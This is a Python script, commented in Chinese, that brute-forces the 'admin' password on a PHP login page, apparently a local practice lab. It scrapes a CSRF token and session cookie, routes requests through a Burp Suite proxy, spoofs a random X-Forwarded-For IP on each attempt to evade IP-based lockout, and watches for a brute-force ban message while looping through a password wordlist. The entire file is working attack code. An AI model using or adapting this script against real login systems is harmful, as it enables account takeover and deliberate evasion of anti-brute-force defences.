import requests
import re
import random

HOST='127.0.0.1'
UserName='admin'
proxy={'http':'http://127.0.0.1:8080'}  #BurpSuite代理


def getToken():
    r=requests.get(f'http://{HOST}/token.php')
    csrf=re.search(r'<input type="hidden" name="csrfToken" value="(.*)">',r.text)
    csrf=csrf[1]
    cookie=r.cookies.get('PHPSESSID')       #获取SessionID
    return csrf,cookie

def login(username,password):
    token,cookie=getToken()
    data={
        'username':username,
        'password':password,
        'csrfToken':token,
        'submit':'submit'
    }
    head={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
        'X-Forwared-For':f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
        #在XFF头里加入随机的IP
    }
    cookies={
        'PHPSESSID':cookie
    }
    r=requests.post(f'http://{HOST}/token.php',data=data,headers=head,cookies=cookies,proxies=proxy,allow_redirects=False)
    if r.status_code != 200:        #这里的逻辑为，登录错误会重定向到登录页面
        return False
    elif 'login incorrect' in r.text:         #或者有的登录页面返回登录错误
        return False
    elif "检测到暴力破解" in r.text:            #加入被Ban检测
        print("BLOCKED")
        return False
    else:
        print(f'{username}:{password}')
        return True
    #我们必须要明白，登陆页面和登录的接口不是同一个url
if __name__=='__main__':
    wordlist=open('dict.txt')
    for line in wordlist.readlines():
        Password=line.strip()
        login(UserName,Password)